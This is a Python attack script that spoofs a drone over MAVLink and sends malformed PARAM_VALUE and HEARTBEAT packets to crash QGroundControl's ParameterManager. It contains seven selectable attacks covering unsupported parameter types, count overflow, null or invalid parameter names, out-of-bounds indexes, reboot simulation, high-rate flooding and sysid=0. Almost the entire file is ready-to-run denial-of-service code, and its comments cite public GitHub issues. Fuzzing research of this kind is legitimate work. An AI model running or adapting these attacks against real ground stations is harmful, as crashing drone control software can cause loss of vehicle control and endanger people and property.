"""
qgc_param_crash.py
============================
Targeted attacks on QGroundControl's ParameterManager.
Based on documented vulnerabilities in QGC GitHub Issues:
  - Issue #1504: crash per parametri inattesi / sysid=0
  - Issue #1126: SIGSEGV in processParamValueMsg
  - Issue #9260: crash durante reboot del veicolo
  - ParameterManager.cc: gestione non robusta di param_type / param_count

Strategy:
1. First establishes a legitimate MAVLink session with QGC
   by sending valid HEARTBEATs to simulate a real drone
2. Waits for QGC to request the parameter list (PARAM_REQUEST_LIST)
3. Responds with malformed PARAM_VALUE that trigger vulnerable
   code paths in ParameterManager.cc

Attacks:
  A) PARAM_VALUE with unsupported param_type (type 100/255)
  B) PARAM_VALUE with param_count=65535 → massive allocation in QGC
  C) PARAM_VALUE with all-null param_id (null-byte injection)
  D) PARAM_VALUE with param_index > param_count (out of bounds)
  E) Vehicle reboot simulation → null pointer in LinkManager
  F) PARAM_VALUE flood at anomalous speed → Qt race condition
  G) PARAM_VALUE with sysid=0 → crash documented in Issue #1504
  ALL) All in sequence

Uso:
    python3 qgc_param_crash.py --attack A
    python3 qgc_param_crash.py --attack B
    python3 qgc_param_crash.py --attack ALL
    python3 qgc_param_crash.py --attack F --count 5000

Requirements:
    pip3 install pymavlink --break-system-packages
"""

import socket
import struct
import time
import argparse
import threading
from datetime import datetime

try:
    from pymavlink import mavutil
except ImportError:
    print("[!] pip3 install pymavlink --break-system-packages")
    exit(1)

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

TARGET_IP   = "172.25.0.1"    # QGC su Windows
TARGET_PORT = 14550            # main port with 3 drones
                               # use 18570 for 1 drone

DRONE_SYSID  = 1               # sysid del drone che impersoniamo
DRONE_COMPID = 1

# ═══════════════════════════════════════════════════════════════
#  BUILDER MAVLink v2 raw
# ═══════════════════════════════════════════════════════════════

MAV_V2_STX = 0xFD

CRC_EXTRA = {
    0:   50,   # HEARTBEAT
    22:  103,  # PARAM_VALUE
    23:  168,  # PARAM_SET
    252: 176,  # STATUSTEXT (override)
}


def compute_crc(data: bytes, seed: int) -> int:
    crc = 0xFFFF
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    tmp = seed ^ (crc & 0xFF)
    tmp = (tmp ^ (tmp << 4)) & 0xFF
    crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def build_v2(sysid, compid, msgid, payload, seq, crc_extra):
    msgid_b = msgid.to_bytes(3, 'little')
    header  = bytes([MAV_V2_STX, len(payload), 0, 0, seq & 0xFF,
                     sysid, compid]) + msgid_b
    crc     = compute_crc(header[1:] + payload, crc_extra)
    return header + payload + struct.pack('<H', crc)


# ─── Message builders ─────────────────────────────

def make_heartbeat(sysid, compid, seq, armed=False, status=3):
    payload = struct.pack('<IBBBBB',
        0,           # custom_mode
        2,           # MAV_TYPE_QUADROTOR
        12,          # MAV_AUTOPILOT_PX4
        0x80 if armed else 0x1D,  # base_mode
        status,      # system_status
        3,           # mavlink_version
    )
    return build_v2(sysid, compid, 0, payload, seq, CRC_EXTRA[0])


def make_param_value(sysid, compid, seq,
                     param_id: bytes,      # 16 bytes
                     param_value: float,
                     param_type: int,      # MAV_PARAM_TYPE
                     param_count: int,     # totale parametri
                     param_index: int):    # indice corrente
    """
    Costruisce PARAM_VALUE (msgid=22).
    Struttura wire (MAVLink field reordering):
      float param_value (4)
      uint16 param_count (2)
      uint16 param_index (2)
      char param_id[16] (16)
      uint8 param_type (1)
    Totale: 25 bytes
    """
    try:
        pv_bytes = struct.pack('<f', param_value)
    except (struct.error, ValueError):
        pv_bytes = b'\x00\x00\xc0\x7f'  # NaN IEEE754

    payload  = pv_bytes
    payload += struct.pack('<HH', param_count & 0xFFFF, param_index & 0xFFFF)
    payload += param_id[:16].ljust(16, b'\x00')
    payload += bytes([param_type & 0xFF])
    return build_v2(sysid, compid, 22, payload, seq, 132)


# ═══════════════════════════════════════════════════════════════
#  CLASSE BASE ATTACCO
# ═══════════════════════════════════════════════════════════════

class QGCAttacker:
    def __init__(self, ip, port, sysid=DRONE_SYSID, compid=DRONE_COMPID):
        self.ip     = ip
        self.port   = port
        self.sysid  = sysid
        self.compid = compid
        self.seq    = 0
        self.sock   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._stop_hb = threading.Event()

    def send(self, pkt):
        self.sock.sendto(pkt, (self.ip, self.port))
        self.seq = (self.seq + 1) % 256

    def start_heartbeat_thread(self, interval=1.0):
        """Sends HEARTBEAT in background to maintain the connection."""
        def _hb_loop():
            seq = 200
            while not self._stop_hb.is_set():
                pkt = make_heartbeat(self.sysid, self.compid, seq)
                self.sock.sendto(pkt, (self.ip, self.port))
                seq = (seq + 1) % 256
                time.sleep(interval)
        t = threading.Thread(target=_hb_loop, daemon=True)
        t.start()
        return t

    def stop_heartbeat(self):
        self._stop_hb.set()

    def close(self):
        self.stop_heartbeat()
        self.sock.close()


# ═══════════════════════════════════════════════════════════════
#  ATTACCHI
# ═══════════════════════════════════════════════════════════════

def attack_A_unsupported_param_type(att: QGCAttacker, count=200):
    """
    Attacco A — PARAM_VALUE con param_type non supportato.

    From ParameterManager.cc:
        qCCritical(ParameterManagerLog) <<
            "ParameterManager::_handleParamValue - unsupported MAV_PARAM_TYPE"
            << paramUnion.type;

    QGC logs the unsupported type but does NOT handle the case safely
    — may crash during value conversion.

    Valid MAVLink types: 1-9. We send: 0, 10-255.
    """
    print(f"\n{'='*60}")
    print(f"  [A] PARAM_VALUE — unsupported param_type")
    print(f"  Based on: ParameterManager.cc qCCritical log")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"{'='*60}\n")

    att.start_heartbeat_thread()
    time.sleep(0.5)

    unsupported_types = [0, 10, 50, 100, 127, 128, 200, 254, 255]
    sent = 0

    for iteration in range(count):
        for ptype in unsupported_types:
            pkt = make_param_value(
                att.sysid, att.compid, att.seq,
                param_id    = b'SYS_AUTOSTART\x00\x00\x00',
                param_value = float('nan'),
                param_type  = ptype,
                param_count = 1000,
                param_index = 0,
            )
            att.send(pkt)
            sent += 1
            time.sleep(0.01)

        if iteration % 50 == 0:
            print(f"  [{iteration+1}/{count}] {sent} pacchetti — QGC vivo?")

    att.stop_heartbeat()
    print(f"\n  [+] Attack A: {sent} packets sent")


def attack_B_param_count_overflow(att: QGCAttacker, count=100):
    """
    Attacco B — PARAM_VALUE con param_count=65535.

    From ParameterManager.cc:
        _setLoadProgress(static_cast<double>(_totalParamCount - waitingReadParamIndexCount)
                         / static_cast<double>(_totalParamCount));

    With param_count=65535, QGC allocates internal structures for all
    65535 expected parameters and updates the progress bar.
    This can cause:
    1. Memory exhaustion (allocating 65535 Qt objects)
    2. Division by zero if _totalParamCount is zeroed
    3. Integer overflow in the progression

    Strategy: first send count=65535 index=0, then index=65534,
    then index=1 — confuses QGC's internal tracker.
    """
    print(f"\n{'='*60}")
    print(f"  [B] PARAM_VALUE — param_count=65535 memory exhaustion")
    print(f"  Based on: ParameterManager.cc _setLoadProgress")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"{'='*60}\n")

    att.start_heartbeat_thread()
    time.sleep(0.5)
    sent = 0

    sequences = [
        # (param_count, param_index, descrizione)
        (65535, 0,     "count=65535 index=0 — annuncia 65535 parametri"),
        (65535, 65534, "count=65535 index=65534 — indice massimo"),
        (65535, 1,     "count=65535 index=1 — fuori sequenza"),
        (65535, 32767, "count=65535 index=32767 — metà"),
        (65534, 65535, "count=65534 index=65535 — index > count"),
        (0,     0,     "count=0 — division by zero in progress"),
        (1,     65535, "count=1 index=65535 — index overflow"),
    ]

    param_names = [
        b'SYS_AUTOSTART\x00\x00\x00',
        b'SYS_ID\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x00' * 16,
        b'CAL_GYRO0_ID\x00\x00\x00\x00',
        b'BAT_N_CELLS\x00\x00\x00\x00\x00',
    ]

    for iteration in range(count):
        for pcount, pindex, desc in sequences:
            for pname in param_names:
                pkt = make_param_value(
                    att.sysid, att.compid, att.seq,
                    param_id    = pname,
                    param_value = 1.0,
                    param_type  = 9,  # MAV_PARAM_TYPE_REAL32
                    param_count = pcount,
                    param_index = pindex,
                )
                att.send(pkt)
                sent += 1
                time.sleep(0.005)

        if iteration % 20 == 0:
            print(f"  [{iteration+1}/{count}] {sent} pacchetti — QGC vivo?")

    att.stop_heartbeat()
    print(f"\n  [+] Attack B: {sent} packets sent")


def attack_C_null_param_id(att: QGCAttacker, count=300):
    """
    Attacco C — PARAM_VALUE con param_id nullo o anomalo.

    From ParameterManager.cc:
        (void) strncpy(parameterNameWithNull, param_value.param_id,
                       MAVLINK_MSG_PARAM_VALUE_FIELD_PARAM_ID_LEN);
        const QString parameterName(parameterNameWithNull);

    strncpy copies exactly 16 bytes. If param_id is all null,
    parameterName is an empty QString. QGC uses this name as a key
    in QMap — an empty string key can cause anomalous behavior.

    Variants:
    - param_id all null → empty string key
    - param_id with null in the middle → unexpected truncation
    - param_id with control chars → anomalous Qt rendering
    - param_id with invalid UTF-8 → crash in QString
    """
    print(f"\n{'='*60}")
    print(f"  [C] PARAM_VALUE — null/anomalous param_id")
    print(f"  Based on: ParameterManager.cc strncpy + QString")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"{'='*60}\n")

    att.start_heartbeat_thread()
    time.sleep(0.5)
    sent = 0

    anomalous_ids = [
        b'\x00' * 16,                         # tutto null
        b'\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00A',  # null alternati
        b'A\x00' * 8,                          # null a metà
        b'\xff' * 16,                          # tutto 0xFF
        b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10',
        b'\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f',
        # UTF-8 invalido
        b'\xc0\xaf\xc0\xaf\xc0\xaf\xc0\xaf\xc0\xaf\xc0\xaf\xc0\xaf\xc0\xaf',
        # Sequenze di escape speciali
        b'../../../etc\x00\x00\x00\x00',
    ]

    for iteration in range(count):
        for pid in anomalous_ids:
            pkt = make_param_value(
                att.sysid, att.compid, att.seq,
                param_id    = pid,
                param_value = 0.0,
                param_type  = 9,
                param_count = 100,
                param_index = 0,
            )
            att.send(pkt)
            sent += 1
            time.sleep(0.008)

        if iteration % 50 == 0:
            print(f"  [{iteration+1}/{count}] {sent} pacchetti — QGC vivo?")

    att.stop_heartbeat()
    print(f"\n  [+] Attack C: {sent} packets sent")


def attack_D_index_out_of_bounds(att: QGCAttacker, count=200):
    """
    Attacco D — PARAM_VALUE con param_index > param_count.

    From ParameterManager.cc:
        _waitingReadParamIndexMap[componentId][waitingIndex] = 0;

    If param_index >= param_count, QGC tries to remove an index
    from the waiting parameter map that does not exist.
    This can cause out-of-bounds accesses on Qt structures.

    Strategy: rapidly alternate small counts with large indexes.
    """
    print(f"\n{'='*60}")
    print(f"  [D] PARAM_VALUE — param_index out of bounds")
    print(f"  Based on: ParameterManager.cc _waitingReadParamIndexMap")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"{'='*60}\n")

    att.start_heartbeat_thread()
    time.sleep(0.5)
    sent = 0

    oob_cases = [
        # (count, index)
        (1,   65535),
        (1,   1),
        (2,   65534),
        (10,  255),
        (100, 65535),
        (0,   1),
        (0,   65535),
    ]

    for iteration in range(count):
        for pcount, pindex in oob_cases:
            pkt = make_param_value(
                att.sysid, att.compid, att.seq,
                param_id    = b'SYS_AUTOSTART\x00\x00\x00',
                param_value = float('nan'),
                param_type  = 6,   # MAV_PARAM_TYPE_INT32
                param_count = pcount,
                param_index = pindex,
            )
            att.send(pkt)
            sent += 1
            time.sleep(0.01)

        if iteration % 50 == 0:
            print(f"  [{iteration+1}/{count}] {sent} pacchetti — QGC vivo?")

    att.stop_heartbeat()
    print(f"\n  [+] Attack D: {sent} packets sent")


def attack_E_vehicle_reboot_sim(att: QGCAttacker):
    """
    Attacco E — Simulazione reboot veicolo.

    From Issue #9260:
        LinkManager::sharedLinkInterfaceForLink returning nullptr
        Segmentation fault (core dumped)

    When a vehicle reboots, QGC first receives a HEARTBEAT
    with status=POWEROFF, then the MAVLink connection drops.
    LinkManager tries to access the link that no longer exists
    → nullptr dereference → SIGSEGV.

    Sequence:
    1. Send normal HEARTBEATs for 3 seconds
    2. Send HEARTBEAT with system_status=POWEROFF (7)
    3. Stop sending HEARTBEATs for 2 seconds (simulate drop)
    4. Resume with new HEARTBEAT from system_status=BOOT (1)
    5. Repeat quickly multiple times
    """
    print(f"\n{'='*60}")
    print(f"  [E] Simulazione reboot veicolo — nullptr in LinkManager")
    print(f"  Basato su: Issue #9260 github.com/mavlink/qgroundcontrol")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"{'='*60}\n")

    seq = 0

    for cycle in range(10):
        print(f"  Ciclo {cycle+1}/10")

        # Fase 1: HEARTBEAT normali
        print(f"    Phase 1: Normal HEARTBEATs (3s)...")
        for _ in range(30):
            pkt = make_heartbeat(att.sysid, att.compid, seq, armed=True, status=4)
            att.sock.sendto(pkt, (att.ip, att.port))
            seq = (seq + 1) % 256
            time.sleep(0.1)

        # Fase 2: POWEROFF
        print(f"    Phase 2: status=POWEROFF...")
        for _ in range(5):
            pkt = make_heartbeat(att.sysid, att.compid, seq, status=7)
            att.sock.sendto(pkt, (att.ip, att.port))
            seq = (seq + 1) % 256
            time.sleep(0.1)

        # Fase 3: silenzio (simula caduta connessione)
        print(f"    Phase 3: silence (2s)...")
        time.sleep(2.0)

        # Fase 4: BOOT
        print(f"    Phase 4: status=BOOT (new boot)...")
        for _ in range(5):
            pkt = make_heartbeat(att.sysid, att.compid, seq, status=1)
            att.sock.sendto(pkt, (att.ip, att.port))
            seq = (seq + 1) % 256
            time.sleep(0.1)

        # Fase 5: PARAM_VALUE subito dopo il reboot
        # This is the most critical moment — QGC is reinitializing
        print(f"    Fase 5: PARAM_VALUE durante reinizializzazione...")
        for i in range(20):
            pkt = make_param_value(
                att.sysid, att.compid, seq,
                param_id    = b'SYS_AUTOSTART\x00\x00\x00',
                param_value = float('nan'),
                param_type  = 255,   # tipo non supportato
                param_count = 65535,
                param_index = i,
            )
            att.sock.sendto(pkt, (att.ip, att.port))
            seq = (seq + 1) % 256
            time.sleep(0.05)

    print(f"\n  [+] Attack E complete")


def attack_F_param_flood(att: QGCAttacker, count=5000):
    """
    Attacco F — Flood PARAM_VALUE ad alta frequenza.

    Qt processes UI events in a single thread.
    If QGC receives PARAM_VALUE at a rate much higher than it can process,
    the Qt event queue fills up.
    This can cause:
    1. Event queue memory exhaustion
    2. Race condition in ParameterManager
    3. UI freeze that becomes a crash

    Target speed: 2000+ pkt/s (vs ~50 pkt/s normal from PX4)
    """
    print(f"\n{'='*60}")
    print(f"  [F] PARAM_VALUE Flood — Qt event queue race condition")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"  {count} packets at maximum speed")
    print(f"{'='*60}\n")

    att.start_heartbeat_thread(0.5)
    time.sleep(0.3)
    sent = 0
    start = time.time()

    param_names = [
        b'SYS_AUTOSTART\x00\x00\x00',
        b'CAL_GYRO0_ID\x00\x00\x00\x00',
        b'BAT_N_CELLS\x00\x00\x00\x00\x00',
        b'SYS_ID\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        b'\x00' * 16,
    ]

    for i in range(count):
        pname = param_names[i % len(param_names)]
        ptype = [9, 6, 255, 0, 100][i % 5]
        pkt   = make_param_value(
            att.sysid, att.compid, att.seq,
            param_id    = pname,
            param_value = float('nan') if i % 3 == 0 else float(i),
            param_type  = ptype,
            param_count = 65535 if i % 10 == 0 else 1000,
            param_index = i % 65535,
        )
        att.send(pkt)
        sent += 1

        if sent % 500 == 0:
            elapsed = time.time() - start
            rate    = sent / elapsed
            print(f"  [{sent}/{count}] {rate:.0f} pkt/s — QGC vivo?")

    att.stop_heartbeat()
    elapsed = time.time() - start
    print(f"\n  [+] Attack F: {sent} pacchetti in {elapsed:.1f}s "
          f"({sent/elapsed:.0f} pkt/s)")


def attack_G_sysid_zero(att: QGCAttacker, count=100):
    """
    Attacco G — PARAM_VALUE da sysid=0.

    From Issue #1504:
        "try to set system ID to 0: qgc will crash immediately.
        Even without Q_ASSERT it will crash, because of segmentation fault."

    We send HEARTBEAT from sysid=0 followed immediately by
    PARAM_VALUE with critical parameters like SYS_AUTOSTART.
    QGC registers the vehicle with ID=0 and then tries to access
    internal structures indexed by sysid — crash from
    index 0 access on structures that assume sysid>=1.
    """
    print(f"\n{'='*60}")
    print(f"  [G] sysid=0 — crash documented in Issue #1504")
    print(f"  Based on: github.com/mavlink/qgroundcontrol/issues/1504")
    print(f"  Target: {att.ip}:{att.port}")
    print(f"{'='*60}\n")

    sent = 0
    for iteration in range(count):
        # HEARTBEAT da sysid=0
        pkt_hb = make_heartbeat(0, 0, att.seq, armed=False, status=3)
        att.sock.sendto(pkt_hb, (att.ip, att.port))
        att.seq = (att.seq + 1) % 256
        sent += 1
        time.sleep(0.02)

        # PARAM_VALUE da sysid=0 con SYS_AUTOSTART
        pkt_pv = make_param_value(
            0, 0, att.seq,
            param_id    = b'SYS_AUTOSTART\x00\x00\x00',
            param_value = 0.0,
            param_type  = 9,
            param_count = 1000,
            param_index = iteration % 1000,
        )
        att.sock.sendto(pkt_pv, (att.ip, att.port))
        att.seq = (att.seq + 1) % 256
        sent += 1
        time.sleep(0.02)

        if iteration % 20 == 0:
            print(f"  [{iteration+1}/{count}] {sent} pacchetti — QGC vivo?")

    print(f"\n  [+] Attack G: {sent} packets sent")


# ─── MAIN ─────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="qgc_param_crash.py — ParameterManager targeted attacks"
    )
    parser.add_argument("--attack",      required=True,
                        choices=["A","B","C","D","E","F","G","ALL"])
    parser.add_argument("--target-ip",   default=TARGET_IP)
    parser.add_argument("--target-port", type=int, default=TARGET_PORT)
    parser.add_argument("--count",       type=int, default=None)
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  qgc_param_crash.py — QGC ParameterManager Attack")
    print(f"  Target  : {args.target_ip}:{args.target_port}")
    print(f"  Attack  : {args.attack}")
    print(f"  Time    : {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}")
    print(f"\n  !! MONITOR QGC — Task Manager open !!")
    print(f"  !! If it crashes → note which attack was active !!\n")
    time.sleep(1)

    att = QGCAttacker(args.target_ip, args.target_port)

    try:
        if args.attack == "A":
            attack_A_unsupported_param_type(att, args.count or 200)
        elif args.attack == "B":
            attack_B_param_count_overflow(att, args.count or 100)
        elif args.attack == "C":
            attack_C_null_param_id(att, args.count or 300)
        elif args.attack == "D":
            attack_D_index_out_of_bounds(att, args.count or 200)
        elif args.attack == "E":
            attack_E_vehicle_reboot_sim(att)
        elif args.attack == "F":
            attack_F_param_flood(att, args.count or 5000)
        elif args.attack == "G":
            attack_G_sysid_zero(att, args.count or 100)
        elif args.attack == "ALL":
            print("\n[*] Sequential execution of all attacks\n")
            attack_G_sysid_zero(att, 50)
            time.sleep(1)
            attack_B_param_count_overflow(att, 50)
            time.sleep(1)
            attack_C_null_param_id(att, 100)
            time.sleep(1)
            attack_D_index_out_of_bounds(att, 100)
            time.sleep(1)
            attack_A_unsupported_param_type(att, 100)
            time.sleep(1)
            attack_E_vehicle_reboot_sim(att)
            time.sleep(1)
            attack_F_param_flood(att, 2000)

    except KeyboardInterrupt:
        print(f"\n[!] Interrupted.")
    finally:
        att.close()
        print(f"\n{'='*60}")
        print(f"  Done. Check QGC on Windows.")
        print(f"{'='*60}\n")


if __name__ == "__main__":
    main()